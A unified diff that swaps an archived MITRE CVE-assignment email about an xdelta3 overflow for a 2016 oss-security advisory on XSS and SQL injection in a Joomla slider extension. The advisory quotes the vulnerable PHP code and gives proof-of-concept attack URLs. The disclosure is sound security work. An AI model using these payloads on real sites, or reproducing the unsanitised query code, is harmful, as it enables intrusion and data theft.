@@ -1,46 +1,73 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/08/2
-Message-Id: <20160208162144.EF2553AE040@smtpvbsrv1.mitre.org>
-Date: Mon,  8 Feb 2016 11:21:44 -0500 (EST)
-From: cve-assign@...re.org
-To: stepan@...osunov.pp.ru
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, security@...ian.org, carnil@...ian.org
-Subject: Re: CVE request - buffer overflow in xdelta3 before 3.0.9
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/28/12
+Message-id: <9F8556B6-3B55-4BFF-898A-92B084238AB6@me.com>
+Date: Thu, 28 Jul 2016 13:58:08 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Reflected XSS and SQLi in Huge IT Joomla Slider v1.0.9 extension
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Title: Reflected XSS and SQLi in Huge IT Joomla Slider v1.0.9 extension
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-07-22
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-images/slider
+Vendor: huge-it.com
+Vendor Notified: 2016-07-22
+Vendor Contact:
+Description: Huge-IT Slider extension is one of the powerful products that our company offer. It gives style and charm to your site and help to attract the attention of visitors to certain parts of the content.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability.
 
-> Buffer overflow was found and fixed in xdelta3 binary diff tool that
-> allows arbitrary code execution from input files at least on some
-> systems.
+XSS in ./admin/views/slider/tmpl/default.php via id variable:
+275:                    <a class="modal" rel="{handler: 'iframe', size: {x: 800, y: 500}}" href="index.php?option=com_slider&view=video&tmpl=component&pid=<?php echo $_GET['id']; ?>" title="Video" >
 
->> This appears to be fixed in xdelta3 3.0.9 and later via
->> https://github.com/jmacd/xdelta-devel/commit/ef93ff74203e030073b898c05e8b4860b5d09ef2
+SQL Injection in the following sections of code:
 
->>> Add appheader tests; fix buffer overflow in main_get_appheader 
+in file ./admin/models/slider.php
+53:        $id_cat = JRequest::getVar('id');
+54-        $query = $db->getQuery(true);
+55-        $query->select('#__huge_itslider_images.name as name,'
+56-                . '#__huge_itslider_images.id ,'
+57-                . '#__huge_itslider_sliders.name as portName,'
+58-                . 'slider_id, #__huge_itslider_images.description as description,image_url,sl_url,sl_type,link_target,#__huge_itslider_images.ordering,#__huge_itslider_images.published,published_in_sl_width');
+--
+69:        $id_cat = JRequest::getVar('id');
+70-        $query = $db->getQuery(true);
+71-        $query->select('*');
+72-        $query->from('#__huge_itslider_images');
+73-        $query->where('slider_id=' . $id_cat);
+74-        $db->setQuery($query);
+--
+117:        $id_cat = JRequest::getVar('id');
+118-
+119-        $query = $db->getQuery(true);
+120-        $query->update('#__huge_itslider_sliders')->set('name ="' . $name . '"')
+121-                ->set('sl_height="' . $sl_height . '"')->set('slider_list_effects_s="' . $slider_effects_list . '"')
+122-                ->set('pause_on_hover="' . $pause_on_hover . '"')
+--
+133:        $id_cat = JRequest::getVar('id');
+134-        $query = $db->getQuery(true);
+135-        $query->update('#__huge_itslider_sliders')->set('slider_list_effects_s ="' . $styleName . '"')->where('id="' . $id_cat . '"');
+136-        $db->setQuery($query);
+137-        $db->execute();
+138-    }
+--
+182:        $id_cat = JRequest::getVar('removeslide');
+183:        $id = JRequest::getVar('id');
+184-        $db = JFactory::getDBO();
+185-        $query = $db->getQuery(true);
+186-        $query->delete('#__huge_itslider_images')->where('id =' . $id_cat);
+187-        $db->setQuery($query);
+188-        $db->execute();
 
-Use CVE-2014-9765.
-
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJWuMArAAoJEL54rhJi8gl5xHkP/iBzelGW14EPlpUBEM5eQgqd
-EW7krDybsq3zfQBvDwzYKcLWvA8HaBIRHQrILz4770wY0HqWQt8BdZxdo70kMwvb
-CXs+Abh7iXrtFUeL/IrOZYmOzjTRrDq1U68Qb+h+yKdyxxxmM8wou8w7rVBYcxSH
-oZnpx+ivfYL8PMGOTZK5z3rWgIN7WL9cCfBrQPzQosueuz0xVNVhI17oTR623Tej
-1xw6pLULp7nxUSrUfwuj6qD3PS6DJgt8VpWVoHLkYOKDt04iFfcC3gbCOpQaU/No
-JwDvK/I81tMOcxTttSyCUU8TkinrT5JvoUpuntbJxRoA5768FE+bXdSfpoaSA2gq
-OHvWq78r43TsVvkHFMrmMqXQjQjqnweAoetwRdpUAgzRUaE/MTwzB40tFfoVjy/X
-tzHcSspNDC+vqQN/hsDhYO13xMbUKzNIq4DyRmiIS1rl92bKV05Ps4XBpEn3T3Iy
-AGMvKi3dKKSgd5bdr82foLIwofS/5liP4Argpa1EyvgdUV+EYDQkhKkjwDqXivtV
-R5aat+cTLhRq8QxOP/6dw3qWIxJCxvUZuZuraFX9FlelTlhj0fJok8evr8PsIHOY
-wzAHaf4+ALZ0LH9zmrCAUqX8tTSDaf6qHYedr2D+Vmh602AiKcfreKMG36Di/sfq
-tmK2aeQbfRSEgh78tPcM
-=m+8A
------END PGP SIGNATURE-----
+CVE-2016-1000121 XSS
+CVE-2016-1000122 SQLi
+Exploit Code:
+	• XSS:
+	•  
+	• http://192.168.0.125/administrator/index.php?option=com_slider&view=slider&id=1%20--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+	•  
+	• SQLi:
+	•  
+	• http://192.168.0.125/administrator/index.php?option=com_slider&view=slider&id=HERE
+Advisory: http://www.vapidlabs.com/advisory.php?v=168
